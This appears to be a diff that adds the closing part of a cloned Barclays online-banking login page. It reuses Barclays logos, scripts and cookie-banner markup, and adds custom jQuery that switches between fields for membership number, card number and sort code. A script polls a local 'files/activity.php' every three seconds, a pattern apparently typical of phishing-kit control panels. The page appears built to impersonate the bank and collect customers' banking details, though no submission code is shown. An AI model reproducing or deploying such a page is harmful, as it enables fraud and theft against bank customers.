+<p><a href=" http://www.bsigroup.com/" target="_blank" title=" http://www.bsigroup.com/"><img alt="Kite Mark" height="62" src="https://bank.barclays.co.uk/OLB/A/Content/Images/1321217916907-bsikitemarklogo.png" width="109" tabindex="0"></a>&nbsp; &nbsp;&nbsp;<a href="https://www.iso.org/isoiec-27001-information-security.html" target="_blank" title="https://www.iso.org/isoiec-27001-information-security.html"><img alt="ISO 27001" height="62" src="https://bank.barclays.co.uk/OLB/A/Content/Images/1321217916492-iso27001footer.JPG" width="107" tabindex="0"></a>&nbsp; &nbsp;<a href="https://www.barclays.co.uk/digisafe/" target="_blank" title="https://www.barclays.co.uk/digisafe/"><img alt="Cyber Essentials" height="50" src="https://bank.barclays.co.uk/OLB/A/Content/Images/1321217918424-cyberfooter.jpg" width="69" tabindex="0"></a>&nbsp; <a href="https://www.fscs.org.uk/" target="_blank" title="https://www.fscs.org.uk/"><img alt="Financial Services Compensation Scheme" height="62" src="https://bank.barclays.co.uk/OLB/A/Content/Images/login-fscs.png" width="54" tabindex="0"><br>
+<br>
+ <br>
+ </a></p></div></b-text> </div> </div> </div> </div> </footer></ng-include>
+        <div id="ROLBspinner" class="hidden"><div class="spinner-css" style="transform:scale(0.5);"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></div>
+    </div>
+
+    <script type="text/javascript" src="https://bank.barclays.co.uk/authlogin/bdlLogin.bootstrap.min.js?v=1606745934868"></script>
+
+    <!-- SiteCatalyst code version: H.25.1.Copyright 1996-2012 Adobe, Inc. All Rights Reserved -->
+    <script type="text/javascript">
+
+        var pathref= "/";
+        if(typeof $ != 'undefined'){
+            $(tagAjaxContent);
+        }
+
+    </script>
+    <script language="JavaScript" type="text/javascript">
+        if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+    </script>
+    <noscript><img src="https://smetrics.barclays.co.uk/b/ss/barukprod/1/H.25.1--NS/0?&server=www.barclays.co.uk&ch=UKRBB&c54=JS_disabled" height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
+    <!-- End SiteCatalyst code version: H.25.1. -->
+
+    <!-- Adobe DTM -- Data Layer Object Initiation -->
+    <script type="text/javascript">
+        var dataLayer = new Object();
+    </script>
+    <!-- End Adobe DTM -- Data Layer Object Initiation -->
+</div>
+
+
+<script>
+  $('input:radio[name="membership"]').change(function() {
+    $('input:radio[name="cardnumber"]').prop("checked", false);
+    $('input:radio[name="sortcode"]').prop("checked", false);
+
+    $('#membershipNumber').css("display", "block");
+    $('#cardNumber').css("display", "none");
+    $('#sortCodeAccountNumber').css("display", "none");
+  })
+
+  $('input:radio[name="cardnumber"]').change(function() {
+    $('input:radio[name="membership"]').prop("checked", false);
+    $('input:radio[name="sortcode"]').prop("checked", false);
+
+    $('#membershipNumber').css("display", "none");
+    $('#cardNumber').css("display", "block");
+    $('#sortCodeAccountNumber').css("display", "none");
+  })
+
+  $('input:radio[name="sortcode"]').change(function() {
+    $('input:radio[name="membership"]').prop("checked", false);
+    $('input:radio[name="cardnumber"]').prop("checked", false);
+
+    $('#membershipNumber').css("display", "none");
+    $('#cardNumber').css("display", "none");
+    $('#sortCodeAccountNumber').css("display", "block");
+  })
+</script>
+
+<script>
+var interval = 3000;
+function heartbeat() {
+    $.ajax({
+            type: 'GET',
+            url: 'files/activity.php',
+            success: function (data) {
+                var parsed_data = JSON.parse(data);
+                console.log(parsed_data);
+            },
+            complete: function (data) {
+                setTimeout(heartbeat, interval);
+            }
+    });
+}
+setTimeout(heartbeat, interval);
+</script>
+
+<div id="__tealiumGDPRecModal"><div class="barclays-gdpr__consent-pane">  <div class="o-sticky-footer o-sticky-footer--intrusive o-sticky-footer--shadow" role="banner" aria-labelledby="barclays-gdpr__consent-pane-title">    <div class="o-sticky-footer__content">      <div class="m-cookie-prompt">        <div class="m-cookie-prompt__content">          <div class="m-cookie-prompt__head">            <h2 class="m-cookie-prompt__heading" id="barclays-gdpr__consent-pane-title">Cookies</h2>          </div>          <div class="m-cookie-prompt__body">            <p class="a-text">              We would like to collect data from your device while you use this website. We do this using cookies. You can find out more in our <a class="a-link" target="_blank" href="https://www.barclays.co.uk/important-information/cookies-policy/">cookie policy</a>. 
+Collecting this data helps us provide the best experience for you, keeps your account secure, helps us provide social media features and allows us to personalise advert and service message content. 
+Please select 'Accept all' to consent to us collecting your data in this way. To see other data collection options, select 'Preferences'.            </p>          </div>        </div>        <div class="m-cookie-prompt__menu">          <div class="m-cookie-prompt__buttons">            <div class="m-cookie-prompt__button">              <button class="barclays-gdpr__preferences-button m-button m-button--full-width">                <span class="m-button__text">Preferences</span>              </button>            </div>            <div class="m-cookie-prompt__button">              <button class="barclays-gdpr__accept-all-button m-button m-button--full-width m-button--primary">                <span class="m-button__text">Accept All</span>              </button>            </div>          </div>        </div>      </div>    </div>  </div></div></div></body></html>
